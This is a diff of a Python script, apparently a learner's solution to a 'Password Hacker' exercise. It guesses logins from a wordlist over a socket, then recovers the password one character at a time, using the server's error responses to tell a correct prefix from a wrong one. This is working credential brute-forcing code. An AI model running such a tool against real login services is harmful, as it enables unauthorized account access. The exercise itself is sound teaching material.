@@ -1,11 +1,14 @@
-from json import dumps, loads
 from argparse import ArgumentParser
 from dataclasses import dataclass
-from itertools import product
+from json import dumps, loads
 from socket import socket
+from string import ascii_letters, digits
 
-FILE = (r'C:\Users\filip\OneDrive\PycharmProjects\Password Hacker (Python)'
-        r'\logins.txt')
+LOGINS = (r'C:\Users\filip\OneDrive\PycharmProjects\Password Hacker (Python)'
+          r'\logins.txt')
+
+ALPHABET = ascii_letters + digits
+
 WRONG_LOGIN = {'result': 'Wrong login!'}
 WRONG_PASSWORD = {'result': 'Wrong password!'}
 BAD_REQUEST = {'result': 'Bad request!'}
@@ -34,19 +37,10 @@ class Credentials(dict):
         return dumps(self, indent=indent)
 
 
-# TODO: check if all case combinations are necessary
-#   if they are then why the first two lines of logins.exe??
 def get_logins():
-    with open(FILE) as f:
-        for line in f:
-            password = line.strip()
-
-            all_cases = ((c.lower(), c.upper()) if c.isalpha() else (c,)
-                         for c in password)
-            all_cases = product(*all_cases)
-            all_cases = map(''.join, all_cases)
-
-            yield from all_cases
+    with open(LOGINS) as f:
+        logins = (line.strip() for line in f)
+        yield from logins
 
 
 def brute_force_login(client):
@@ -57,9 +51,27 @@ def brute_force_login(client):
         response = client.recv(1024).decode()
         response = loads(response)
 
-        # TODO?: match responses as dicts to ignore formatting
         if response == WRONG_PASSWORD:
             return login
+
+
+def brute_force_password(client, login):
+    password = []
+    found = False
+    while not found:
+        for character in ALPHABET:
+            candidate = ''.join(password) + character
+            credentials = Credentials(login, candidate)
+
+            client.send(credentials.to_json().encode())
+            response = client.recv(1024).decode()
+            response = loads(response)
+
+            if response == EXCEPTION:
+                password.append(character)
+                break
+            elif response == SUCCESS:
+                return candidate
 
 
 def main():
@@ -69,6 +81,9 @@ def main():
         client.connect(config.address)
 
         login = brute_force_login(client)
+        password = brute_force_password(client, login)
+
+    print(dumps(dict(login=login, password=password)))
 
 
 if __name__ == "__main__":
